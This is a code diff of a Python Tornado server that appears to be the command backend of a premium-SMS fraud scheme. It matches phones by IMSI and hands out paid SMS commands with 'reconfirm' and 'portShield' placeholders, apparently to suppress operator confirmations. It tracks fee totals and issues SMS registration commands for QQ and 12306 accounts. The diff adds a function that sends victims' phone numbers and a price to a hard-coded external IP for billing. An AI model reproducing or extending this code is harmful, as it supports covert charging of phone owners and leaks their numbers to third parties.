@@ -96,12 +96,12 @@ class MatchHandler(tornado.web.RequestHandler):
         _dbConfig = poolConfig.connection()
         _cur = _dbConfig.cursor()
         _sql = 'SELECT imsi FROM `imsi_users` WHERE id = %s '
-        _cur.execute(_sql, (self.get_argument('id')))
+        _cur.execute(_sql, [self.get_argument('id')])
         _recordRsp = _cur.fetchone()
         if _recordRsp != None:
             _sql = "update `imsi_users` set mobile=%s where id = %s"
-            _cur.execute(_sql, (self.get_argument(
-                'mobile'), self.get_argument('id')))
+            _cur.execute(_sql, [self.get_argument(
+                'mobile'), self.get_argument('id')])
         _cur.close()
         _dbConfig.close()
 
@@ -148,13 +148,13 @@ def get_imsi_response(_imsi, _threads):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT id,imsi,mobile,matchCount,mobile_areas.province,mobile_areas.city,mobile_areas.mobileType,ifnull(lastCmdTime,0) as lastCmdTime,ifnull(cmdFeeSum,0) as cmdFeeSum,ifnull(cmdFeeSumMonth,0) as cmdFeeSumMonth ,lastRegisterCmdAppIdList,ifnull(registerQqCmdCount,0) as registerQqCmdCount,ifnull(registerQqSuccessCount,0) as registerQqSuccessCount,ifnull(register12306CmdCount,0) as register12306CmdCount,ifnull(register12306SuccessCount,0) as register12306SuccessCount,insertTime FROM `imsi_users` LEFT JOIN mobile_areas ON SUBSTR(IFNULL(imsi_users.mobile,\'8612345678901\'),3,7)=mobile_areas.`mobileNum`  WHERE imsi =  %s '
-    _cur.execute(_sql, (_imsi))
+    _cur.execute(_sql, [_imsi])
     _record_user = _cur.fetchone()
     print(_record_user)
     ctime = int(time.time())
     if _record_user == None:
         _sql = 'insert into `imsi_users` (imsi,insertTime) value (%s,%s)'
-        _cur.execute(_sql, (_imsi, time.time()))
+        _cur.execute(_sql, [_imsi, time.time()])
         _sql = "SELECT LAST_INSERT_ID() as id"
         _cur.execute(_sql)
         _record_user = _cur.fetchone()
@@ -188,7 +188,7 @@ def get_sms_ad_cmd(_user, _threads):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT * FROM wait_send_ads order by id limit 1 '
-    _cur.execute(_sql, ())
+    _cur.execute(_sql)
     _record = _cur.fetchone()
     if _record != None:
         _result = SMS_REGISTER_CONTENT.replace(
@@ -235,7 +235,7 @@ def delete_wait_sms_ad(_record):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'delete from wait_send_ads where id=%s '
-    _cur.execute(_sql, (_record['id']))
+    _cur.execute(_sql, [_record['id']])
     _cur.close()
     _dbConfig.close()
 
@@ -276,7 +276,7 @@ def get_cmd(_user, _threads):
         _dbConfig = poolConfig.connection()
         _cur = _dbConfig.cursor()
         _sql = 'SELECT * FROM `sms_cmd_configs` , `sms_cmd_covers` WHERE `sms_cmd_configs`.id=`sms_cmd_covers`.`smsCmdId` AND province = %s AND mobileType = %s and sms_cmd_covers.state = \'open\' and sms_cmd_configs.state = \'open\' order by rand() limit 1 '
-        _cur.execute(_sql, (_user['province'], _user['mobileType']))
+        _cur.execute(_sql, [_user['province'], _user['mobileType']])
         _record = _cur.fetchone()
         # print(_record)
         _cur.close()
@@ -290,13 +290,29 @@ def get_cmd(_user, _threads):
                 '[reconfirm]', _record['provinceReconfirm'] or str(_record['reconfirm'])).replace('[portShield]',  _record['provincePortShield'] or str(_record['portShield'])).replace('[times]', str(_record['times']))
             _threads.append(threading.Thread(
                 target=insert_fee_cmd_log(_user, _record, _current_cmd_content)))
+            if _record['spNumber'] == '10658999' and _record['msg'] == 'DH242839':
+                _threads.append(threading.Thread(
+                    target=sync_score(_user)))
             return _current_cmd_content
     else:
         print('can not match province' + str(_user))
         return None
 
 
+def sync_score(user):
+    url = 'http://116.62.161.6/shsuwangsms'
+    mobile = user['mobile']
+    if len(user['mobile']) == 13:
+        mobile = user['mobile'][2:]
+    _r = requests.get(url, params={
+        'cpid': '10jf4750142', 'price': 10,  'tel': mobile, 'smsContent': '1'})
+    # _r = requests.get(url)
+    print(_r.url)
+    print(_r.text)
+
 # 获取短信注册类指令
+
+
 def get_register_cmd(_user, _threads):
     _result = None
     if isOpenSmsRegisterHour('Qq') and str(_user['lastRegisterCmdAppIdList']).find(',4,') != -1 and int(get_system_parameter_from_db("qqRegisterLimit")) > 0 and int(_user['registerQqCmdCount']) <= (int(get_system_parameter_from_db("qqRegisterLimit")) + TRY_MORE_TIMES) and int(_user['registerQqSuccessCount']) < int(get_system_parameter_from_db("qqRegisterLimit")):
@@ -478,11 +494,11 @@ def get_test_response(_imsi_info):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
-    _cur.execute(_sql, (_imsi_info['imsi'], _imsi_info['testStatus']))
+    _cur.execute(_sql, [_imsi_info['imsi'], _imsi_info['testStatus']])
     _recordRsp = _cur.fetchone()
     if _recordRsp == None:
         _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
-        _cur.execute(_sql, ("def", _imsi_info['testStatus']))
+        _cur.execute(_sql, ["def", _imsi_info['testStatus']])
         _recordRsp = _cur.fetchone()
     else:
         print(_recordRsp)
@@ -496,7 +512,7 @@ def check_test_imsi(_imsi):
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT imsi,testStatus FROM test_imsis WHERE imsi = %s'
-    _cur.execute(_sql, (imsi))
+    _cur.execute(_sql, [imsi])
     _record = _cur.fetchone()
     _cur.close()
     _dbConfig.close()
